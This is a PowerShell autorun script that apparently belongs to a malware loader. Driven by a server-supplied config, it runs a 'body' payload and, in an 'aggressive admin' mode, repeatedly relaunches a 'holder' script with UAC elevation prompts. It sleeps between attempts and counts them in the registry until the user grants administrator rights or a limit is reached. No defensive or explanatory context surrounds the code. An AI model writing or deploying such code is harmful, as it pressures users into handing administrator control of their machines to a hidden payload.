. ./utils.ps1
. ./consts_body.ps1

$globalScriptPaths = @(
    #$MyInvocation.MyCommand.Definition,
    $PSCommandPath,
    $MyInvocation.MyCommand.Path
)

function Get-ScriptPath {
    
    foreach ($path in $globalScriptPaths) {
        try {
            if (Test-Path $path) {
                return $path
            }
        }
        catch {
        }
    }
}

function do_autorun()
{
    $holder = (Get-HolderPath)
    $body = (Get-BodyPath)
    if ($server.aggressiveAdmin)
    {
        $limit = $server.aggressiveAdminTimes
        $times = RegReadParamInt -keyName "aggressiveAdminTimes"
        $elevated = IsElevated
        if ($elevated)
        {
            writedbg "running elevated body path in aggressive admin"
            RunMe -script $body  -repassArgs $false -argName "" -argValue "" -uac $true

            $times = $times + 1
            RegWriteParamInt -keyName "aggressiveAdminTimes" -value $times
            writedbg "runned elevated: $times"
        } 
        else 
        {
            if ($limit -gt 0)
            {
                writedbg "times= $times,aggressiveAdminTimes= $limit"
                if ($times -gt $limit)
                {
                    writedbg "no more times $times, running non elevated"
                    RunMe -script $body  -repassArgs $false -argName "" -argValue "" -uac $false
                    return
                }
            }

            $attempt = GetArgInt("attempt")
            $attempt = $attempt + 1
            if ($attempt -ne 1)
            {
                $sleep = $server.aggressiveAdminDelay
                writedbg "Not elevated, sleeping: $sleep"
                Start-Sleep -Seconds $sleep
            }
            if ($server.aggressiveAdminAttempts -gt 0 -and $attempt -gt $server.aggressiveAdminAttempts)
            {
                writedbg "Not elevated run non-elevating body"
                RunMe -script $body -repassArgs $false -argName "" -argValue "" -uac $false    
            }
            else 
            {
                writedbg "trying to elevate holder"
                try {
                    RunMe -script $holder -repassArgs $false -argName "attempt" -argValue $attempt -uac $true  
                }
                catch {
                    RunMe -script $holder -repassArgs $true -argName "attempt" -argValue $attempt -uac $false  
                }        
            }
        }
    }
    else 
    {
        writedbg "No aggresive admin"
        try 
        {
            RunMe -script $body -repassArgs $false -argName "" -argValue "" -uac $true
        }
        catch {
            RunMe -script $body -repassArgs $false -argName "" -argValue "" -uac $false
        }
    }

}

do_autorun